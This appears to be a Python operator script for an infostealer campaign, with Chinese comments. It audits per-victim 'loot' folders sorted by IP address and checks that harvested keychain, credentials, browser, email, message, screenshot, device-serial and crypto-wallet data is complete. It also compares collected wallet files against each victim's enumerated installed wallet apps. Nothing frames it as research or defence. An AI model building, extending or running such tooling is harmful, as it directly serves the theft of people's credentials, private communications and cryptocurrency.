#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""18 链跑批完整性核对器
用法: python3 check18.py <IP桶> [时间下限 epoch]
判据: installed_cryptos.txt 枚举到的 bundleId 数  vs  实收 wallet-* 类别数
      枚举 > 实收 = 跑批被截断（agent 没跑完）
"""
import json, glob, os, sys, base64, collections, datetime

L = '/www/wwwroot/i.131422.com/loot'
ip = sys.argv[1] if len(sys.argv) > 1 else '182.239.121.187'
since = float(sys.argv[2]) if len(sys.argv) > 2 else 0
D = os.path.join(L, ip)

if not os.path.isdir(D):
    print('桶不存在:', D); sys.exit(1)

cats = collections.Counter()
bytes_by_cat = collections.Counter()
enum_ids = None
dev = None
rows = []
for f in glob.glob(os.path.join(D, 'ext_stats_*.bin')):
    if os.path.getmtime(f) < since: continue
    try: j = json.load(open(f, encoding='utf-8', errors='replace'))
    except Exception: continue
    cat = j.get('category') or '?'
    p = str(j.get('path') or '')
    rows.append((os.path.getmtime(f), cat, p, j.get('size') or 0))
    cats[cat] += 1
    bytes_by_cat[cat] += (j.get('size') or 0)
    if dev is None and j.get('deviceSerial'):
        dev = '%s / %s / %s' % (j.get('devicePt'), j.get('deviceOv'), j.get('deviceSerial'))
    if 'installed_cryptos' in p:
        try:
            txt = base64.b64decode(j.get('data', '')).decode('utf-8', 'replace')
            enum_ids = [l.replace('[Bundle ID]', '').strip() for l in txt.splitlines() if l.startswith('[Bundle ID]')]
        except Exception: pass

rows.sort()
print('=' * 78)
print('18 链跑批完整性核对  IP=%s' % ip)
if dev: print('设备: %s' % dev)
if rows:
    print('时间: %s ~ %s   包数 %d   %.2f MB' % (
        datetime.datetime.utcfromtimestamp(rows[0][0]).strftime('%m-%d %H:%M:%S'),
        datetime.datetime.utcfromtimestamp(rows[-1][0]).strftime('%m-%d %H:%M:%S'),
        len(rows), sum(r[3] for r in rows) / 1048576))
print()
print('--- 类别分布 ---')
for k, v in cats.most_common():
    print('  %-34s %4d 个   %8.2f MB' % (k, v, bytes_by_cat[k] / 1048576))
print()
wallet_cats = sorted({c for c in cats if c.startswith('wallet-')})
# 历史完整跑批的基线类别（09-05/07/08 四次实测 24-25 个包都有这些）
BASE = {'keychain','device','browser','communications','email',
        'credentials','accounts','personal','screenshots','system'}
have = {c for c in cats}
miss = BASE - have
print('--- 基线类别覆盖（判定主判据） ---')
print('  基线 %d 类，命中 %d 类' % (len(BASE), len(BASE & have)))
if miss:
    print('  ❌ 缺失: %s  → 跑批不完整（agent 做了一半）' % ', '.join(sorted(miss)))
else:
    print('  ✅ 基线类别全覆盖')
print()
print('--- 钱包（次判据：应 >=1 个 wallet-* 类别） ---')
print('  实收 wallet-* 类别 (%d): %s' % (len(wallet_cats), wallet_cats or '无'))
if enum_ids:
    print('  installed_cryptos.txt 枚举 %d 个 bundleId:' % len(enum_ids))
    for e in enum_ids:
        norm = e.lower()
        hit = [c for c in wallet_cats if norm.replace('.', '-').replace('_', '-') in c]
        print('     %-58s %s' % (e[:58], hit[0] if hit else '（无独立包：可能是 AppGroup 归并 / 该 App 无可抓文件）'))
print()
print('=' * 78)
if not miss and wallet_cats:
    print('  ✅ 判定: 跑批完整（基线 %d/%d + 钱包 %d 个类别）' % (len(BASE & have), len(BASE), len(wallet_cats)))
elif miss:
    print('  ⚠️ 判定: 跑批被截断 —— 基线缺 %d 类' % len(miss))
else:
    print('  ⚠️ 判定: 基线全有但零钱包 —— 检查设备是否装了钱包 / 容器是否落盘')
print('=' * 78)
